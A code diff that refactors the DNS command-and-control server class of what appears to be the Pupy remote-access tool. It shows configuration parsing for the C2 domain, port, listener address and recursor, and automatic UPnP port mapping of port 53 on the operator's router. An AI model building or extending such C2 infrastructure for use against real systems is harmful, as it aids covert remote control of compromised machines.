@@ -6,7 +6,7 @@ from network.lib.picocmd.picocmd import *
 from Queue import Queue
 
 from pupylib.PupyConfig import PupyConfig
-from pupylib.utils.network import get_listener_ip
+from pupylib.utils.network import get_listener_ip, get_listener_port
 
 import requests
 import netifaces
@@ -57,26 +57,42 @@ class PupyDnsCommandServerHandler(DnsCommandServerHandler):
 
 class PupyDnsCnc(object):
     def __init__(
-            self, domain, igd=None, connect_host=None,
-            recursor='8.8.8.8', port=5353, listen='0.0.0.0',
+            self, igd=None, connect_host=None,
+            recursor=None,
             connect_transport='ssl', connect_port=443,
             config=None, credentials=None
         ):
 
         credentials = credentials or Credentials()
         config = config or PupyConfig()
+
         self.config = config
-
-        connect_host = connect_host or config.getip('pupyd', 'address')
-
+        self.credentials = credentials
         self.igd = igd
-        self.transport = connect_transport or config.get('pupyd', 'transport')
-        self.port = int(connect_port  or config.getint('pupyd', 'port'))
-        self.host = connect_host if connect_host else get_listener_ip(
-            external=True, config=config, igd=igd
-        )
-        if self.host:
-            self.host = [ str(self.host) ]
+
+        fdqn = self.config.get('pupyd', 'dnscnc').split(':')
+        domain = fdqn[0]
+        if len(fdqn) > 1:
+            port = int(fdqn[1])
+        else:
+            port = 53
+
+        listen = str(config.get('pupyd', 'address') or '0.0.0.0')
+        prefer_external = config.getboolean('gen', 'external')
+
+        self.host = [
+            str(get_listener_ip(
+                external=prefer_external,
+                config=config,
+                igd=igd
+            ))
+        ]
+        self.port = get_listener_port(config, external=prefer_external)
+        self.transport = config.get('pupyd', 'transport')
+
+        recursor = config.get('pupyd', 'recursor')
+        if recursor and recursor.lower() in ('no', 'false', 'stop', 'n', 'disable'):
+            recursor = None
 
         self.dns_domain = domain
         self.dns_port = port
@@ -95,8 +111,8 @@ class PupyDnsCnc(object):
         )
 
         if self.igd and self.igd.available:
-            self.igd.AddPortMapping(int(port), 'UDP', 53)
-            self.igd.AddPortMapping(int(port), 'TCP', 53)
+            self.igd.AddPortMapping(53, 'UDP', int(port))
+            self.igd.AddPortMapping(53, 'TCP', int(port))
 
         self.server.start()
 
